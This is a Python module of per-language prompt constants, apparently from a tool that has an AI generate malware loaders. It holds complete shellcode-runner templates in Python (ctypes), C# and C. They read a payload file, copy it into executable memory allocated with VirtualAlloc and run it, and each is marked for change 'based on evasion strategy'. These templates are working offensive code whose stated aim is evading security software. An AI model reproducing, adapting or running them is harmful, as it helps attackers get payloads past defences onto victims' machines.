"""Per-language constants and base code templates used in prompts and checks."""

_PY_FILE_TPL = """# Read shellcode from file and execute
import sys
import ctypes
from ctypes import wintypes
import urllib.request

# Extend wintypes for 64-bit compatibility to prevent AttributeError
wintypes.ULONGLONG = ctypes.c_ulonglong
wintypes.SIZE_T = ctypes.c_size_t
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)

# Windows API definitions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
VirtualAlloc.restype = wintypes.LPVOID

VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

VirtualFree = kernel32.VirtualFree
VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
VirtualFree.restype = wintypes.BOOL

LoadLibraryW = kernel32.LoadLibraryW
LoadLibraryW.argtypes = [wintypes.LPCWSTR]
LoadLibraryW.restype = wintypes.HMODULE

GetModuleHandleW = kernel32.GetModuleHandleW
GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
GetModuleHandleW.restype = wintypes.HMODULE

# Constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
PAGE_READWRITE = 0x04

def main():
    if len(sys.argv) < 2:
        sys.exit(1)

    with open(sys.argv[1], 'rb') as f:
        payload = f.read()

    # Base execution template (Modify this based on evasion strategy)
    exec_mem = VirtualAlloc(None, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    ctypes.memmove(exec_mem, (ctypes.c_ubyte * len(payload)).from_buffer_copy(payload), len(payload))

    shellcode_func = ctypes.CFUNCTYPE(None)(exec_mem)
    shellcode_func()

    VirtualFree(exec_mem, 0, MEM_RELEASE)
    return 0

if __name__ == "__main__":
    main()"""

_CSHARP_FILE_TPL = """using System;
using System.IO;
using System.Runtime.InteropServices;

public class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void RunShellcode();

    public static void Main(string[] args)
    {
        if (args.Length < 1) return;
        byte[] payload = File.ReadAllBytes(args[0]);

        // Base execution template (Modify this based on evasion strategy)
        IntPtr execMem = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(payload, 0, execMem, payload.Length);

        RunShellcode func = (RunShellcode)Marshal.GetDelegateForFunctionPointer(execMem, typeof(RunShellcode));
        func();

        VirtualFree(execMem, 0, MEM_RELEASE);
    }
}"""

_C_FILE_TPL = """// Read shellcode from file
FILE *fp = fopen(argv[1], "rb");
if (!fp) { return 1; }
fseek(fp, 0, SEEK_END);
size_t shellcode_size = ftell(fp);
fseek(fp, 0, SEEK_SET);
unsigned char *shellcode = (unsigned char*)malloc(shellcode_size);
fread(shellcode, 1, shellcode_size, fp);
fclose(fp);"""


def is_python(target_language: str) -> bool:
    return target_language in ('python', 'py')


def is_csharp(target_language: str) -> bool:
    return target_language in ('.net', 'csharp', 'c#')


def language_context(target_language: str) -> dict:
    """Template/prompt variables describing the target language."""
    lang = (target_language or 'c').lower()
    if is_python(lang):
        return {
            'lang_name': 'Python',
            'analysis_lang_name': 'Python script',
            'review_lang_name': 'Python script',
            'code_block_tag': 'python',
            'comment_prefix': '#',
            'args_name': 'sys.argv[1]',
            'file_tpl': _PY_FILE_TPL,
            'compiler_name': 'Python interpreter',
            'guidelines_key': 'python',
            'is_python': True,
            'is_csharp': False,
        }
    if is_csharp(lang):
        return {
            'lang_name': 'C# / .NET',
            'analysis_lang_name': 'C# source',
            'review_lang_name': 'C# code',
            'code_block_tag': 'csharp',
            'comment_prefix': '//',
            'args_name': 'args[0]',
            'file_tpl': _CSHARP_FILE_TPL,
            'compiler_name': 'csc.exe',
            'guidelines_key': 'csharp',
            'is_python': False,
            'is_csharp': True,
        }
    return {
        'lang_name': 'C / C++',
        'analysis_lang_name': 'C source',
        'review_lang_name': 'C code',
        'code_block_tag': 'c',
        'comment_prefix': '//',
        'args_name': 'argv[1]',
        'file_tpl': _C_FILE_TPL,
        'compiler_name': 'MSVC (cl.exe)',
        'guidelines_key': 'c',
        'is_python': False,
        'is_csharp': False,
    }
